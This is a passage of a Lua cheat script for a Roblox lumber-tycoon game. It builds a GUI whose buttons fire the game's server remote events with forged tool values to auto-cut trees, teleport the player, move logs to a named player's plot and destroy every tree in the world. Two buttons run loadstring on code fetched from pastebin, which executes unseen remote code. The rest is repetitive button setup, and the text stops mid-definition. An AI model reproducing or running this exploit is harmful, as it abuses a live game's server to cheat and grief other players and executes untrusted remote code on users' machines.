function GetTree(Wood, PlayerName, Quantitys)
local Counter = 0
local HitPoints={
['Beesaxe']= 1.4;
['AxeAmber']= 3.39;
['ManyAxe']= 10.2;
['BasicHatchet']= 0.2;
['Axe1']= 0.55;
['Axe2']= 0.93;
['AxeAlphaTesters']= 1.5;
['Rukiryaxe']= 1.68;
['Axe3']= 1.45;
['AxeBetaTesters']= 1.45;
['FireAxe']= 0.6;
['SilverAxe']= 1.6;
['EndTimesAxe']= 1.58;
['AxeChicken']= 0.9;
['CandyCaneAxe']= 0;
['AxeTwitter']= 1.65
}
function axe(Val)
local A_1 = Val.CutEvent
local A_2 = 
{
	["tool"] = game.Players.LocalPlayer.Character:FindFirstChild("Tool"), 
	["faceVector"] = Vector3.new(0, 0, -1), 
	["height"] = 0.3, 
	["sectionId"] = 1, 
	["hitPoints"] = HitPoints[game.Players.LocalPlayer.Character:FindFirstChild("Tool").ToolName.Value], 
	["cooldown"] = 0.112, 
	["cuttingClass"] = "Axe"
}
local Event = game:GetService("ReplicatedStorage").Interaction.RemoteProxy
Event:FireServer(A_1, A_2)
end
local Ps = nil
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players[PlayerName] then
Ps = v.OriginSquare.Position + Vector3.new(0,30,0)
end
end
for i,v in pairs(game.Workspace:GetDescendants()) do
    if v:FindFirstChild("TreeClass") and v.TreeClass.Value == Wood and v.Name == "Model" then
    Teleport(v.WoodSection.Position.X,v.WoodSection.Position.Y,v.WoodSection.Position.Z)
    for i=1,50 do
    wait(0.0900)
    axe(v)
    end
for i,v in pairs(Workspace.LogModels:GetChildren()) do
if v:FindFirstChild("Owner") and v.Owner.Value == game.Players.LocalPlayer and v.TreeClass.Value == Wood then
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
v:MoveTo(Ps)
game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v)
end
end
Counter = Counter + 1
if Quantitys - Counter == 0 then
print("Breaked")
break
end
wait(0.2)
end
end
wait(0.2)
for i, v in pairs(game.Workspace.Properties:GetChildren()) do
if v.Owner.Value == game.Players[PlayerName] then
Teleport(v.OriginSquare.Position.X, v.OriginSquare.Position.Y + 3.2, v.OriginSquare.Position.Z)
end
end
end
GoldTree.MouseButton1Down:connect(function()
GetTree("GoldSwampy", PlayerNameb.Text, QuantityTree.Text)
end)

ZombieTree.MouseButton1Down:connect(function()
GetTree("GreenSwampy", PlayerNameb.Text, QuantityTree.Text)
end)
CavecrawlerTree.MouseButton1Down:connect(function()
GetTree("CaveCrawler", PlayerNameb.Text, QuantityTree.Text)
end)
Frosttree.MouseButton1Down:connect(function()
GetTree("Frost", PlayerNameb.Text, QuantityTree.Text)
end)
KoaTree.MouseButton1Down:connect(function()
GetTree("Koa", PlayerNameb.Text, QuantityTree.Text)
end)
ElmTree.MouseButton1Down:connect(function()
GetTree("Oak", PlayerNameb.Text, QuantityTree.Text)
end)
LavaTree.MouseButton1Down:connect(function()
GetTree("Volcano", PlayerNameb.Text, QuantityTree.Text)
end)
Snowglowtree.MouseButton1Down:connect(function()
GetTree("SnowGlow", PlayerNameb.Text, QuantityTree.Text)
end)
WalnutTree.MouseButton1Down:connect(function()
GetTree("Walnut", PlayerNameb.Text, QuantityTree.Text)
end)
BirchTree.MouseButton1Down:connect(function()
GetTree("Birch", PlayerNameb.Text, QuantityTree.Text)
end)
GenericTree.MouseButton1Down:connect(function()
GetTree("Generic", PlayerNameb.Text, QuantityTree.Text)
end)
CherryTree.MouseButton1Down:connect(function()
GetTree("Cherry", PlayerNameb.Text, QuantityTree.Text)
end)
FirTree.MouseButton1Down:connect(function()
GetTree("Fir", PlayerNameb.Text, QuantityTree.Text)
end)
PineTree.MouseButton1Down:connect(function()
GetTree("Pine", PlayerNameb.Text, QuantityTree.Text)
end)
SinisterTree.MouseButton1Down:connect(function()
GetTree("SpookyNeon", PlayerNameb.Text, QuantityTree.Text)
end)
SpookTree.MouseButton1Down:connect(function()
GetTree("Spook", PlayerNameb.Text, QuantityTree.Text)
end)
PalmTree.MouseButton1Down:connect(function()
GetTree("Palm", PlayerNameb.Text, QuantityTree.Text)
end)
PhantomTree.MouseButton1Down:connect(function()
GetTree("LoneCave", PlayerNameb.Text, QuantityTree.Text)
end)

WoodTools = Instance.new("TextLabel")
WoodTools.Name = "WoodTools"
WoodTools.Parent = WoodFrame
WoodTools.BackgroundColor3 = Color3.new(255, 0, 0)
WoodTools.BackgroundTransparency = 0
WoodTools.Position = UDim2.new(0, 5, 0, 167)
WoodTools.Size = UDim2.new(0, 165, 0, 20)
WoodTools.Font = Enum.Font.Fantasy
WoodTools.Text = "Wood Tools"
WoodTools.TextColor3 = Color3.new(1, 1, 1)
WoodTools.TextSize = 14

Harddrag = Instance.new("TextButton")
Harddrag.Name = "Harddrag"
Harddrag.Parent = WoodFrame
Harddrag.BackgroundColor3 = Color3.new(0, 0, 0)
Harddrag.BackgroundTransparency = 0.59999998807907
Harddrag.BorderColor3 = Color3.new(1, 0, 0)
Harddrag.Position = UDim2.new(0, 3, 0, 190)
Harddrag.Size = UDim2.new(0, 165, 0, 20)
Harddrag.Font = Enum.Font.Fantasy
Harddrag.Text = "Hard Drag"
Harddrag.TextColor3 = Color3.new(1, 1, 1)
Harddrag.TextSize = 14
Harddrag.MouseButton1Down:connect(function()
	  makesound("rbxassetid://156785206")
Harddrag.Text = "HARD DRAG ACTIVE"
Harddrag.TextColor3 = Color3.new(0, 1, 0)
loadstring(game:HttpGet(('https://pastebin.com/raw/uMv85wZZ'),true))()
end)

InfoText23 = Instance.new("TextLabel")
InfoText23.Name = "InfoText2"
InfoText23.Parent = MainFrame
InfoText23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText23.BorderColor3 = Color3.new(1, 0, 0)
InfoText23.BackgroundTransparency = 0
InfoText23.Position = UDim2.new(0, 28, 0, 330)
InfoText23.Size = UDim2.new(0, 150, 0, 150)
InfoText23.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText23.Font = Enum.Font.Fantasy
InfoText23.Text =  "Harddrag\n\n1.Point at a Plank or Tree.\n2.CLICK LEFT mouse button.\n\n\nThis Tool will help you move heavy loads."
InfoText23.TextSize = 14
InfoText23.TextWrapped = true
InfoText23.Visible = false

Harddrag.MouseEnter:connect(function()
InfoText23.Visible = true
end)

Harddrag.MouseLeave:connect(function()
InfoText23.Visible = false
end)

RemoveT = Instance.new("TextButton")
RemoveT.Name = "RemoveT"
RemoveT.Parent = WoodFrame
RemoveT.BackgroundColor3 = Color3.new(0, 0, 0)
RemoveT.BackgroundTransparency = 0.59999998807907
RemoveT.BorderColor3 = Color3.new(1, 0, 0)
RemoveT.Position =  UDim2.new(0, 3, 0, 213)
RemoveT.Size = UDim2.new(0, 165, 0, 20)
RemoveT.Font = Enum.Font.Fantasy
RemoveT.Text = "Remove Trees"
RemoveT.TextColor3 = Color3.new(1, 1, 1)
RemoveT.TextSize = 14
RemoveT.MouseButton1Down:connect(function() 
  makesound("rbxassetid://156785206")
	RemoveT.BackgroundColor3 = Color3.new(0, 0, 0)
                     RemoveT.TextColor3 = Color3.new(0, 1, 0)
for i,v in pairs(game.Workspace:GetDescendants()) do
    if v.Name == "WoodSection" and v.Parent:FindFirstChild("CutEvent") then
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v.Parent)
    end
end
game.Workspace.DescendantAdded:connect(function(Thing)
    wait(0.1)
    if Thing.Name == "WoodSection" and Thing.Parent:FindFirstChild("CutEvent") then
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Thing.Parent)
        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(Thing.Parent)
    end
end)
end)

treep2 = Instance.new("TextButton")
treep2.Name = "treep2"
treep2.Parent = WoodFrame
treep2.BackgroundColor3 = Color3.new(0, 0, 0)
treep2.BackgroundTransparency = 0.59999998807907
treep2.BorderColor3 = Color3.new(1, 0, 0)
treep2.Position = UDim2.new(0, 3, 0, 232)
treep2.Size = UDim2.new(0, 165, 0, 20)
treep2.Font = Enum.Font.Fantasy
treep2.Text = "Bring Tree 2"
treep2.TextColor3 = Color3.new(1, 1, 1)
treep2.TextSize = 14
treep2.MouseButton1Down:connect(function()
	  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('https://pastebin.com/raw/agxnEgWc'),true))()
end)


Sorter = Instance.new("ImageButton")
Sorter.Name = "Sorter"
Sorter.Parent = Picker
Sorter.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Sorter.BorderColor3 = Color3.new(0, 0, 0)
Sorter.Position = UDim2.new(0, 15, 0, 260)
Sorter.Size = UDim2.new(0, 80, 0, 80)
Sorter.ZIndex = 3
Sorter.Image = "rbxassetid://5046661756"
Sorter.ScaleType = Enum.ScaleType.Crop
Sorter.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892949606"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
AIntroImage2.Visible = true
AIntroImage3.Visible = true
TimesFrame.Visible = false
end)

MoveFrame = Instance.new("Frame")
MoveFrame.Name = "BuyFrame"
MoveFrame.Parent = MenuFrame
MoveFrame.BorderSizePixel = 0
MoveFrame.BackgroundTransparency = 0.5
MoveFrame.BorderColor3 = Color3.new(0, 0, 0)
MoveFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MoveFrame.Size = UDim2.new(0, 170, 0, 281)
MoveFrame.Visible = false

MoveWood = Instance.new("ScrollingFrame")
MoveWood.Name = "Woodrus"
MoveWood.Parent = MenuFrame
MoveWood.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MoveWood.BackgroundTransparency = 0.5
MoveWood.Position =  UDim2.new(0, 179, 0, 0)
MoveWood.BorderColor3 = Color3.new(0, 0, 0)
MoveWood.Size = UDim2.new(0, 195, 0, 450)
MoveWood.CanvasPosition = Vector2.new(0,0)
MoveWood.CanvasSize = UDim2.new(0, 0, 0, 420)
MoveWood.Visible = false

WoodMove = Instance.new("TextButton")
WoodMove.Name = "WoodMove"
WoodMove.Parent = MoveFrame
WoodMove.BackgroundColor3 = Color3.new(0, 0, 0)
WoodMove.BorderColor3 = Color3.new(1, 0, 0)
WoodMove.BackgroundTransparency = 0.6
WoodMove.Position =  UDim2.new(0, 3, 0, 50)
WoodMove.Size = UDim2.new(0, 164, 0, 20)
WoodMove.Font = Enum.Font.Fantasy
WoodMove.Text = "Sort Wood"
WoodMove.TextColor3 = Color3.new(1, 1, 1)
WoodMove.TextSize = 14
WoodMove.MouseButton1Click:connect(function()
MoveFrame.Visible = true
TimesFrame.Visible = false
PlyrSelz.Text = Player1z.Text
end)

Type = Instance.new("TextBox")
Type.Name = "Type"
Type.Parent = MoveFrame
Type.BackgroundColor3 = Color3.new(0, 0, 0)
Type.BackgroundTransparency = 0.6
Type.BorderSizePixel = 1
Type.BorderColor3 = Color3.fromRGB(196, 40, 28)
Type.Position = UDim2.new(0, 3, 0, 3)
Type.Size = UDim2.new(0, 137, 0, 20)
Type.Font = Enum.Font.Fantasy
Type.Text = "Select Item"
Type.TextColor3 = Color3.new(0, 1, 0)
Type.TextSize = 14

qty = Instance.new("TextBox")
qty.Name = "MoveQty"
qty.Parent = MoveFrame
qty.BackgroundColor3 = Color3.new(0, 0, 0)
qty.BackgroundTransparency = 0.6
qty.BorderSizePixel = 1
qty.BorderColor3 = Color3.fromRGB(196, 40, 28)
qty.Position = UDim2.new(0, 142, 0, 3)
qty.Size = UDim2.new(0, 25, 0, 20)
qty.Font = Enum.Font.Fantasy
qty.Text = "1"
qty.TextColor3 = Color3.new(0, 1, 0)
qty.TextSize = 14

FillBirch = Instance.new("ImageButton")
FillBirch.Name = "FillBirch"
FillBirch.Parent = MoveWood
FillBirch.BackgroundColor3 = Color3.new(1, 1, 1)
FillBirch.BackgroundTransparency = 0
FillBirch.BorderColor3 = Color3.new(0.6, 0, 0)
FillBirch.Position = UDim2.new(0, 3, 0, 3)
FillBirch.Size = UDim2.new(0, 137, 0, 20)
FillBirch.Image = "rbxassetid://2712547918"
FillBirch.MouseButton1Down:connect(function()
Type.Text = "Birch Planks"
SingleItemTpQty("Birch", PlyrSelz.Text, qty.Text)
end)

CountItems = Instance.new("TextLabel")
CountItems.Parent = MoveWood
CountItems.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems.BackgroundTransparency = 0.6
CountItems.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems.Position = UDim2.new(0, 147, 0, 3)
CountItems.Size = UDim2.new(0, 25, 0, 20)
CountItems.Font = Enum.Font.Fantasy
CountItems.Text = "0"
CountItems.TextColor3 = Color3.new(0, 1, 0)
CountItems.TextSize = 14

FillCherry = Instance.new("ImageButton")
FillCherry.Name = "FillCherry"
FillCherry.Parent = MoveWood
FillCherry.BackgroundColor3 = Color3.new(1, 1, 1)
FillCherry.BackgroundTransparency = 0
FillCherry.BorderColor3 = Color3.new(0.6, 0, 0)
FillCherry.Position = UDim2.new(0, 3, 0, 26)
FillCherry.Size = UDim2.new(0, 137, 0, 20)
FillCherry.Image = "rbxassetid://2712608599"
FillCherry.MouseButton1Down:connect(function()
Type.Text = "Cherry Planks"
SingleItemTpQty("Cherry", PlyrSelz.Text, qty.Text)
end)

CountItems2 = Instance.new("TextLabel")
CountItems2.Parent = MoveWood
CountItems2.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems2.BackgroundTransparency = 0.6
CountItems2.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems2.Position = UDim2.new(0, 147, 0, 26)
CountItems2.Size = UDim2.new(0, 25, 0, 20)
CountItems2.Font = Enum.Font.Fantasy
CountItems2.Text = "0"
CountItems2.TextColor3 = Color3.new(0, 1, 0)
CountItems2.TextSize = 14

FillGeneric = Instance.new("ImageButton")
FillGeneric.Name = "FillGeneric"
FillGeneric.Parent = MoveWood
FillGeneric.BackgroundColor3 = Color3.new(1, 1, 1)
FillGeneric.BackgroundTransparency = 0
FillGeneric.BorderColor3 = Color3.new(0.6, 0, 0)
FillGeneric.Position = UDim2.new(0, 3, 0, 49)
FillGeneric.Size = UDim2.new(0, 137, 0, 20)
FillGeneric.Image = "rbxassetid://2712568624"
FillGeneric.MouseButton1Down:connect(function()
Type.Text = "Generic Planks"
SingleItemTpQty("Generic", PlyrSelz.Text, qty.Text)
end)

CountItems3 = Instance.new("TextLabel")
CountItems3.Parent = MoveWood
CountItems3.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems3.BackgroundTransparency = 0.6
CountItems3.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems3.Position = UDim2.new(0, 147, 0, 49)
CountItems3.Size = UDim2.new(0, 25, 0, 20)
CountItems3.Font = Enum.Font.Fantasy
CountItems3.Text = "0"
CountItems3.TextColor3 = Color3.new(0, 1, 0)
CountItems3.TextSize = 14

FillOakTree = Instance.new("ImageButton")
FillOakTree.Name = "OakTree"
FillOakTree.Parent = MoveWood
FillOakTree.BackgroundColor3 = Color3.new(1, 1, 1)
FillOakTree.BackgroundTransparency = 0
FillOakTree.BorderColor3 = Color3.new(0.6, 0, 0)
FillOakTree.Position = UDim2.new(0, 3, 0, 72)
FillOakTree.Size = UDim2.new(0, 137, 0, 20)
FillOakTree.Image = "rbxassetid://2712579185"
FillOakTree.MouseButton1Down:connect(function()
Type.Text = "Oak Planks"
SingleItemTpQty("Oak", PlyrSelz.Text, qty.Text)
end)

CountItems4 = Instance.new("TextLabel")
CountItems4.Parent = MoveWood
CountItems4.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems4.BackgroundTransparency = 0.6
CountItems4.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems4.Position = UDim2.new(0, 147, 0, 72)
CountItems4.Size = UDim2.new(0, 25, 0, 20)
CountItems4.Font = Enum.Font.Fantasy
CountItems4.Text = "0"
CountItems4.TextColor3 = Color3.new(0, 1, 0)
CountItems4.TextSize = 14

FillPalm = Instance.new("ImageButton")
FillPalm.Name = "FillPalm"
FillPalm.Parent = MoveWood
FillPalm.BackgroundColor3 = Color3.new(1, 1, 1)
FillPalm.BackgroundTransparency = 0.6
FillPalm.BorderColor3 = Color3.new(0.6, 0, 0)
FillPalm.Position = UDim2.new(0, 3, 0, 96)
FillPalm.Size = UDim2.new(0, 137, 0, 20)
FillPalm.Image = "rbxassetid://2712597395"
FillPalm.MouseButton1Down:connect(function()
Type.Text = "Palm Planks"
SingleItemTpQty("Palm", PlyrSelz.Text, qty.Text)
end)

CountItems5 = Instance.new("TextLabel")
CountItems5.Parent = MoveWood
CountItems5.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems5.BackgroundTransparency = 0.6
CountItems5.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems5.Position = UDim2.new(0, 147, 0, 96)
CountItems5.Size = UDim2.new(0, 25, 0, 20)
CountItems5.Font = Enum.Font.Fantasy
CountItems5.Text = "0"
CountItems5.TextColor3 = Color3.new(0, 1, 0)
CountItems5.TextSize = 14

FillPine = Instance.new("ImageButton")
FillPine.Name = "FillPine"
FillPine.Parent = MoveWood
FillPine.BackgroundColor3 = Color3.new(1, 1, 1)
FillPine.BackgroundTransparency = 1
FillPine.BorderColor3 = Color3.new(0.6, 0, 0)
FillPine.Position = UDim2.new(0, 3, 0, 119)
FillPine.Size = UDim2.new(0, 137, 0, 20)
FillPine.Image = "rbxassetid://2712591183"
FillPine.MouseButton1Down:connect(function()
Type.Text = "Pine Planks"
SingleItemTpQty("Pine", PlyrSelz.Text, qty.Text)
end)

CountItems6 = Instance.new("TextLabel")
CountItems6.Parent = MoveWood
CountItems6.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems6.BackgroundTransparency = 0.6
CountItems6.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems6.Position = UDim2.new(0, 147, 0, 119)
CountItems6.Size = UDim2.new(0, 25, 0, 20)
CountItems6.Font = Enum.Font.Fantasy
CountItems6.Text = "0"
CountItems6.TextColor3 = Color3.new(0, 1, 0)
CountItems6.TextSize = 14

FillWalnut = Instance.new("ImageButton")
FillWalnut.Name = "FillWalnut"
FillWalnut.Parent = MoveWood
FillWalnut.BackgroundColor3 = Color3.new(1, 1, 1)
FillWalnut.BackgroundTransparency = 1
FillWalnut.BorderColor3 = Color3.new(0.6, 0, 0)
FillWalnut.Position = UDim2.new(0, 3, 0, 142)
FillWalnut.Size = UDim2.new(0, 137, 0, 20)
FillWalnut.Image = "rbxassetid://2712559790"
FillWalnut.MouseButton1Down:connect(function()
Type.Text = "Walnut Planks"
SingleItemTpQty("Walnut", PlyrSelz.Text, qty.Text)
end)

CountItems7 = Instance.new("TextLabel")
CountItems7.Parent = MoveWood
CountItems7.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems7.BackgroundTransparency = 0.6
CountItems7.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems7.Position = UDim2.new(0, 147, 0, 142)
CountItems7.Size = UDim2.new(0, 25, 0, 20)
CountItems7.Font = Enum.Font.Fantasy
CountItems7.Text = "0"
CountItems7.TextColor3 = Color3.new(0, 1, 0)
CountItems7.TextSize = 14

FillKoa = Instance.new("ImageButton")
FillKoa.Name = "FillKoa"
FillKoa.Parent = MoveWood
FillKoa.BackgroundColor3 = Color3.new(1, 1, 1)
FillKoa.BackgroundTransparency = 1
FillKoa.BorderColor3 = Color3.new(0.6, 0, 0)
FillKoa.Position = UDim2.new(0, 3, 0, 165)
FillKoa.Size = UDim2.new(0, 137, 0, 20)
FillKoa.Image = "rbxassetid://2712612798"
FillKoa.MouseButton1Down:connect(function()
Type.Text = "Koa Planks"
SingleItemTpQty("Koa", PlyrSelz.Text, qty.Text)
end)

CountItems8 = Instance.new("TextLabel")
CountItems8.Parent = MoveWood
CountItems8.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems8.BackgroundTransparency = 0.6
CountItems8.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems8.Position = UDim2.new(0, 147, 0, 165)
CountItems8.Size = UDim2.new(0, 25, 0, 20)
CountItems8.Font = Enum.Font.Fantasy
CountItems8.Text = "0"
CountItems8.TextColor3 = Color3.new(0, 1, 0)
CountItems8.TextSize = 14

FillVolcano = Instance.new("ImageButton")
FillVolcano.Name = "FillVolcano"
FillVolcano.Parent = MoveWood
FillVolcano.BackgroundColor3 = Color3.new(1, 1, 1)
FillVolcano.BackgroundTransparency = 1
FillVolcano.BorderColor3 = Color3.new(0.6, 0, 0)
FillVolcano.Position = UDim2.new(0, 3, 0, 188)
FillVolcano.Size = UDim2.new(0, 137, 0, 20)
FillVolcano.Image = "rbxassetid://2712618609"
FillVolcano.MouseButton1Down:connect(function()
Type.Text = "Lava Planks"
SingleItemTpQty("Volcano", Player1z.Text, qty.Text)
end)

CountItems9 = Instance.new("TextLabel")
CountItems9.Parent = MoveWood
CountItems9.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems9.BackgroundTransparency = 0.6
CountItems9.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems9.Position = UDim2.new(0, 147, 0, 188)
CountItems9.Size = UDim2.new(0, 25, 0, 20)
CountItems9.Font = Enum.Font.Fantasy
CountItems9.Text = "0"
CountItems9.TextColor3 = Color3.new(0, 1, 0)
CountItems9.TextSize = 14

FillGoldSwampy = Instance.new("ImageButton")
FillGoldSwampy.Name = "FillGoldSwampy"
FillGoldSwampy.Parent = MoveWood
FillGoldSwampy.BackgroundColor3 = Color3.new(1, 1, 1)
FillGoldSwampy.BackgroundTransparency = 1
FillGoldSwampy.BorderColor3 = Color3.new(0.6, 0, 0)
FillGoldSwampy.Position = UDim2.new(0, 3, 0, 211)
FillGoldSwampy.Size = UDim2.new(0, 137, 0, 20)
FillGoldSwampy.Image = "rbxassetid://2712631457"
FillGoldSwampy.MouseButton1Down:connect(function()
Type.Text = "Gold Planks"
SingleItemTpQty("GoldSwampy", PlyrSelz.Text, qty.Text)
end)

CountItems10 = Instance.new("TextLabel")
CountItems10.Parent = MoveWood
CountItems10.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems10.BackgroundTransparency = 0.6
CountItems10.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems10.Position = UDim2.new(0, 147, 0, 211)
CountItems10.Size = UDim2.new(0, 25, 0, 20)
CountItems10.Font = Enum.Font.Fantasy
CountItems10.Text = "0"
CountItems10.TextColor3 = Color3.new(0, 1, 0)
CountItems10.TextSize = 14

FillGreenSwampy = Instance.new("ImageButton")
FillGreenSwampy.Name = "FillGreenSwampy"
FillGreenSwampy.Parent = MoveWood
FillGreenSwampy.BackgroundColor3 = Color3.new(1, 1, 1)
FillGreenSwampy.BackgroundTransparency = 1
FillGreenSwampy.BorderColor3 = Color3.new(0.6, 0, 0)
FillGreenSwampy.Position = UDim2.new(0, 3, 0, 234)
FillGreenSwampy.Size = UDim2.new(0, 137, 0, 20)
FillGreenSwampy.Image = "rbxassetid://2712623896"
FillGreenSwampy.MouseButton1Down:connect(function()
Type.Text = "Zombie Planks"
SingleItemTpQty("GreenSwampy", PlyrSelz.Text, qty.Text)
end)

CountItems11 = Instance.new("TextLabel")
CountItems11.Parent = MoveWood
CountItems11.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems11.BackgroundTransparency = 0.6
CountItems11.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems11.Position = UDim2.new(0, 147, 0, 234)
CountItems11.Size = UDim2.new(0, 25, 0, 20)
CountItems11.Font = Enum.Font.Fantasy
CountItems11.Text = "0"
CountItems11.TextColor3 = Color3.new(0, 1, 0)
CountItems11.TextSize = 14

FillSnowGlow = Instance.new("ImageButton")
FillSnowGlow.Name = "FillSnowGlow"
FillSnowGlow.Parent = MoveWood
FillSnowGlow.BackgroundColor3 = Color3.new(1, 1, 1)
FillSnowGlow.BackgroundTransparency = 1
FillSnowGlow.BorderColor3 = Color3.new(0.6, 0, 0)
FillSnowGlow.Position = UDim2.new(0, 3, 0, 257)
FillSnowGlow.Size = UDim2.new(0, 137, 0, 20)
FillSnowGlow.Image = "rbxassetid://2712651454"
FillSnowGlow.MouseButton1Down:connect(function()
Type.Text = "SnowGlow Planks"
SingleItemTpQty("SnowGlow", PlyrSelz.Text, qty.Text)
end)

CountItems12 = Instance.new("TextLabel")
CountItems12.Parent = MoveWood
CountItems12.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems12.BackgroundTransparency = 0.6
CountItems12.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems12.Position = UDim2.new(0, 147, 0, 257)
CountItems12.Size = UDim2.new(0, 25, 0, 20)
CountItems12.Font = Enum.Font.Fantasy
CountItems12.Text = "0"
CountItems12.TextColor3 = Color3.new(0, 1, 0)
CountItems12.TextSize = 14

FillCaveCrawler = Instance.new("ImageButton")
FillCaveCrawler.Name = "FillCaveCrawler"
FillCaveCrawler.Parent = MoveWood
FillCaveCrawler.BackgroundColor3 = Color3.new(1, 1, 1)
FillCaveCrawler.BackgroundTransparency = 1
FillCaveCrawler.BorderColor3 = Color3.new(0.6, 0, 0)
FillCaveCrawler.Position = UDim2.new(0, 3, 0, 280)
FillCaveCrawler.Size = UDim2.new(0, 137, 0, 20)
FillCaveCrawler.Image = "rbxassetid://2712673980"
FillCaveCrawler.MouseButton1Down:connect(function()
Type.Text = "Cavecrawler Planks"
SingleItemTpQty("CaveCrawler", PlyrSelz.Text, qty.Text)
end)

CountItems13 = Instance.new("TextLabel")
CountItems13.Parent = MoveWood
CountItems13.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems13.BackgroundTransparency = 0.6
CountItems13.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems13.Position = UDim2.new(0, 147, 0, 280)
CountItems13.Size = UDim2.new(0, 25, 0, 20)
CountItems13.Font = Enum.Font.Fantasy
CountItems13.Text = "0"
CountItems13.TextColor3 = Color3.new(0, 1, 0)
CountItems13.TextSize = 14

FillSpooky = Instance.new("ImageButton")
FillSpooky.Name = "FillSpooky"
FillSpooky.Parent = MoveWood
FillSpooky.BackgroundColor3 = Color3.new(1, 1, 1)
FillSpooky.BackgroundTransparency = 1
FillSpooky.BorderColor3 = Color3.new(0.6, 0, 0)
FillSpooky.Position = UDim2.new(0, 3, 0, 303)
FillSpooky.Size = UDim2.new(0, 137, 0, 20)
FillSpooky.Image = "rbxassetid://2712696822"
FillSpooky.MouseButton1Down:connect(function()
Type.Text = "Spook Planks"
SingleItemTpQty("Spooky", PlyrSelz.Text, qty.Text)
end)

CountItems14 = Instance.new("TextLabel")
CountItems14.Parent = MoveWood
CountItems14.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems14.BackgroundTransparency = 0.6
CountItems14.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems14.Position = UDim2.new(0, 147, 0, 303)
CountItems14.Size = UDim2.new(0, 25, 0, 20)
CountItems14.Font = Enum.Font.Fantasy
CountItems14.Text = "0"
CountItems14.TextColor3 = Color3.new(0, 1, 0)
CountItems14.TextSize = 14

FillLoneCave = Instance.new("ImageButton")
FillLoneCave.Name = "FillLoneCave"
FillLoneCave.Parent = MoveWood
FillLoneCave.BackgroundColor3 = Color3.new(1, 1, 1)
FillLoneCave.BackgroundTransparency = 1
FillLoneCave.BorderColor3 = Color3.new(0.6, 0, 0)
FillLoneCave.Position = UDim2.new(0, 3, 0, 326)
FillLoneCave.Size = UDim2.new(0, 137, 0, 20)
FillLoneCave.Image = "rbxassetid://2712693147"
FillLoneCave.MouseButton1Down:connect(function()
Type.Text = "Phantom Planks"
SingleItemTpQty("LoneCave", PlyrSelz.Text, qty.Text)
end)

CountItems15 = Instance.new("TextLabel")
CountItems15.Parent = MoveWood
CountItems15.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems15.BackgroundTransparency = 0.6
CountItems15.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems15.Position = UDim2.new(0, 147, 0, 326)
CountItems15.Size = UDim2.new(0, 25, 0, 20)
CountItems15.Font = Enum.Font.Fantasy
CountItems15.Text = "0"
CountItems15.TextColor3 = Color3.new(0, 1, 0)
CountItems15.TextSize = 14


FillSpookyNeon = Instance.new("ImageButton")
FillSpookyNeon.Name = "FillSpookyNeon"
FillSpookyNeon.Parent = MoveWood
FillSpookyNeon.BackgroundColor3 = Color3.new(1, 1, 1)
FillSpookyNeon.BackgroundTransparency = 1
FillSpookyNeon.BorderColor3 = Color3.new(0.6, 0, 0)
FillSpookyNeon.Position = UDim2.new(0, 3, 0, 349)
FillSpookyNeon.Size = UDim2.new(0, 137, 0, 20)
FillSpookyNeon.Image = "rbxassetid://2712700047"
FillSpookyNeon.MouseButton1Down:connect(function()
Type.Text = "SinisterGlow Planks"
SingleItemTpQty("SpookyNeon", PlyrSelz.Text, qty.Text)
end)

CountItems16 = Instance.new("TextLabel")
CountItems16.Parent = MoveWood
CountItems16.BackgroundColor3 = Color3.new(0, 0, 0)
CountItems16.BackgroundTransparency = 0.6
CountItems16.BorderColor3 = Color3.new(0.207843, 0, 0)
CountItems16.Position = UDim2.new(0, 147, 0, 349)
CountItems16.Size = UDim2.new(0, 25, 0, 20)
CountItems16.Font = Enum.Font.Fantasy
CountItems16.Text = "0"
CountItems16.TextColor3 = Color3.new(0, 1, 0)
CountItems16.TextSize = 14

FillFrost = Instance.new("ImageButton")
FillFrost.Name = "FillFrost"
FillFrost.Parent = MoveWood
FillFrost.BackgroundColor3 = Color3.new(1, 1, 1)
FillFrost.BackgroundTransparency = 1
